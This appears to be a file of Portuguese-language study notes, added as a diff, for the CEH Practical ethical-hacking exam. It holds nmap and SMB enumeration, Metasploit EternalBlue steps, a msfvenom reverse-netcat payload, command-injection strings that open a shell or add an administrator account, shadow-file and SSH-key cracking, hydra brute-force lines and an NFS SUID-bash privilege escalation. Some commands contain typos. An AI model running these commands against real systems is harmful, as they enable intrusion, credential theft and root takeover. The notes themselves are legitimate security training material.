@@ -1,0 +1,223 @@
+Anotações para prova CEH
+https://github.com/dhabaleshwar/CEHPractical/blob/main/Everything You Need.md
+https://github.com/infovault-Ytube/CEH-Practical-Notes
+https://github.com/Samsar4/Ethical-Hacking-Labs
+https://github.com/nirangadh/ceh-practical/tree/main
+https://book.thegurusec.com/certifications/certified-ethical-hacker-practical
+https://github.com/cmuppin/CEH
+https://chirag-singla.notion.site/CEH-Practical-Preparation-7f2b77651cd144e8872f2f5a30155052
+https://medium.com/@jonathanchelmus/c-eh-practical-exam-review-42755546c82e
+https://infayer.com/archivos/65 (Use Google Translate)
+https://www.reddit.com/r/CEH/comments/dfa1y8/passed_ceh_practical/
+https://www.reddit.com/r/CEH/comments/jg0y6u/ceh_practical/
+
+Thiagão
+nmap -sT (parece equivaler ao telnet … TCP completo)
+sudo nmap -sS -p 445 -A 192.168.10.10
+netBIOS udp 137 138 139
+nbtstat
+no WIndows, nbtstat -a 192.168…  → nome das maquinas
+nbtstat -c → pra ver se tem no cache
+nmap -sV -v —script nbstat.nse 192.168….  → enumeracao de versao
+nmap -sU -p 137 —script nbstat.nse 192.168….  → su usp scan
+SMB - usa netbios tbm. TCP 445, mas usa UDP 137, 138 e 139 tbm para algumas coisas
+sudo nmap -A -p 445 192.168…
+sudo nmap —script smb-os-discovery.nse 192.168…
+nmap -p 445 —script=smb-enum-shares.nse, smb-enum-users.nse 192.168…
+enum4linux -a 192.168… (muito bom)
+smbclient -L → lista compartilhamentos
+smbclient //10.10.50.26/share -U suit(usuario) → acessa
+nmap -sC → executa scrips padrão
+Posso fazer nmap -A -sC -v ?
+Sim, você pode usar nmap -A -sC -v, mas não é a melhor prática, porque -A já inclui -sC.
+📌 O que cada opção faz?
+•	-A → Ativa detecção de SO, detecção de versão de serviços, traceroute e executa os scripts padrão (-sC).
+•	-sC → Executa apenas os scripts padrão (já incluído no -A).
+•	-v → Ativa modo detalhado (verbose), mostrando mais informações na saída.
+🚀 Melhor alternativa:
+Se você já está usando -A, não precisa do -sC, então um comando mais limpo seria:
+nmap -A -v 192.168.1.1
+​
+Se quiser mais scripts além dos padrões, pode adicionar:
+nmap -A -v --script=vuln 192.168.1.1
+​
+Isso executaria os scripts de detecção de vulnerabilidades também.
+Quer ainda mais detalhes? Use -vv:
+nmap -A -vv 192.168.1.1
+​
+Metasploit
+sudo msfconsole
+use exploit/windows/smb/ms17_010_psexec
+options
+set RHOSTS 192.168…
+set LHOSTS 192….
+exploit
+search eternal (hackeando um windows, exemplo)
+use [numero]
+options
+meterpreter> ps
+meterpreter> migrate 334 (numero do processo)
+meterpreter> screenshot
+meterpreter> help
+meterpreter> getuid
+meterpreter> screenshare
+meterpreter> shell
+Control Z deixa a sessao em segundo plano
+msf> sessions
+search  shell_to_meterpreter
+sessions
+sessions -i 3
+meterpreter>
+search seila
+use 4
+back (pra voltar)
+
+
+Vulnerability Assessment
+Searchsploit (exploit DB)
+searchsploit vsftpd 2.3.4
+sudo nmap —script vuln 10.10….
+Nessus
+FTP tcp 21
+ftp 10.10….
+user anonymous senha vazia
+ls cd get pull
+brute force no ftp 
+hydra -l mike -P /usr/share/wordlist/rockyou.yxy -v 10.10.223.2 ftp
+invasão hacking
+chmod 600 id_rsa
+com id_rsa consigo acesso ssh direto assim:
+ssh -t id_rsa cactus@10.10.50.26
+telnet ip porta
+scan telnet port: nmap -sS -T4 -p- 10.10.50.26 (default port 23)
+sudo nmap -sS -sV -p- -O 10.10.5.166
+telnet 10.10.5.166 8012 tryhackme
+tcpdump to listening
+sudo tcpdump ip proto \\icmp -i tun0
+msfvenom -l payloads | grep netcat
+msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=444 R (export the payload in raw format)
+nc -lnvp 444
+•	-l → Modo “listen” (escuta), ou seja, aguarda conexões em vez de iniciar uma.
+•	-n → Não resolve nomes de domínio (IP direto, sem DNS).
+•	-v → Modo “verbose” (exibe mais detalhes sobre a conexão).
+•	-p 444 → Especifica a porta 444 para escutar conexões.
+Command execution vulnerabilities (web - linux)
+127.0.0.1 && ls
+127.0.0.1 & ls
+127.0.0.1 ; ls
+127.0.0.1 |ls (sem espaço mesmo)
+127.0.0.1 && nc -c sh 127.0.0.1 9001 (daí no terminal parrot usar nc -lnvp 9001 primeiro)
+Command execution vulnerabilities (windows)
+|Hostname
+|whoami
+|tasklist
+|taskkill /PID 3112 /F
+|dir c:\ 
+|net user
+|net user test /add
+|net localgroup Administrators test /add
+|net user test
+|dir c:\ “pin.txt” 
+|type c:\”pin.txt”
+Num site qualquer
+1 - clico pra ver o codigo fonte
+2 - procuro /robots.txt
+3 - Usar ffuf → fuff -u http://annex.upload.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt
+      Usar ffuf → fuff -u http://annex.upload.thm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt
+File Upload Vuln
+Escalação de privilégios
+pkexec
+linPEAS.sh
+whoami
+sudo -l → vê os privilégios
+make compila o codigo em C
+./arquivo executa o programa
+exemplo 2
+com um usuário sem privilegios root, daí fazer o seguinte:
+cat /etc/passwd e bota tudo num arquivo passwd la
+cat /etc/shadow e bota tudo num arquivo shadow la
+unshadow passwd shadown > pwd.txt
+john pwd.txt -w=/usr/share/wordlists/john.lst
+daí acha a senha do root
+gtfobins.github.io/gtfobins/cat/ ?????
+Passo 1) Instala NFS service na maquina vitima(target)
+sudo apt-get update
+sudo apt install nfs-kernel-server
+nano /etc/exports
+Passo 2) 
+/home           *(rw,no_root_squash)
+Passo 3) 
+sudo /etc/init.d/nfs-kernel-server restart
+Passo 4) No Parrot OS
+nmap -sV —script=nfs-showmount 192.168.1.102
+Passo 5)
+apt-get install nfs-common
+showmount -e 192.168.1.102
+sudo nmap -sV —script=nfs-showmount 192.168.1.102
+Passo 6)
+mkdir /tmp/nfs
+mount -t nfs 192.168.1.102:/home /tmp/nfs
+cp /bin/bash .
+sudo chmod +s bash
+ls -la bash
+sudo df -h
+ssh -l ubuntu@192.168.1.102
+Passo 7) Dentro do ubuntu(vitima) pelo ssh acima
+cd /home
+ls
+./bash -p.  (vira root aqui!!)
+id
+whoami
+Passo 8)
+cp /bin/nano .
+chmod 4777 nano
+ls -la nano
+Passo 9)
+./nano -p /etc/shadow
+Wireshark
+  http.request.method==post
+  frame tcp contains “%PDF”
+ 
+Esteganografia
+Textos
+pra esconder:
+snow -C -m “Alou alou” -p “senha” original.txt criptografado.txt
+no WIndows colocar snow.exe
+pra ver o texto escondido:
+snow -C -p “senha” criptografado.txt
+Imagem
+OpenStego (Windows)
+StegOnline (web) stegonline.georgeom.net
+Net  user
+Snow.exe -C -p “given_password” file_name
+—---------------------
+wpscan --url http://10.10.10.12:8080/CEG --enumerate u
+msfconsole
+use axiliary/scanner/http/wordpress_login_enum
+PASS_FILE /root/Desktop/wordlists/Passwords.txt
+set RHOSTs 10.10.10.12
+set RPORT 8080
+set TARGETURI http://10.10.10.12:8080/CEH/
+set USERNAME admin
+run
+—------------------------
+Nmap -Pn -p 21 target > ftp
+grep -B 5 open ftp
+—--------------------------
+Nmap -Pn -p 3389 target > rdp
+grep -B 5 open rdp
+—-------------------------
+Nmap -Pn -p 3306 target > mysql
+grep -B 5 open mysql
+Hydra -l james -P given_wordlist ftp://target
+importante!
+hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://127.0.0.1:42001/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=7vs4mhc1q4dnp3f6cgikl01v9q; security=low:F=Username and/or password incorrect’
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.200.10 http-post-form “/admin/:user=^USER^&pass=^PASS^:F=Username or pass invalid” -V -I -t 4
+se eu pegar uma chave RSA PRIVATE KEY, copiar, depois:
+nano key.txt e colar a bagaça
+ssh2john key.txt > hash.txt
+john hash.txt -w=/usr/share/wordlists/rockyou.txt (mas pode usar primeiro a lista john.lst)
+daí acha a senha
+cp key.txt key.pem          (atenção, é a key.txt e não a hash.txt aqui)
+chmod 600 key.pem
+ssh -i key.pem admin@10.10.102.2
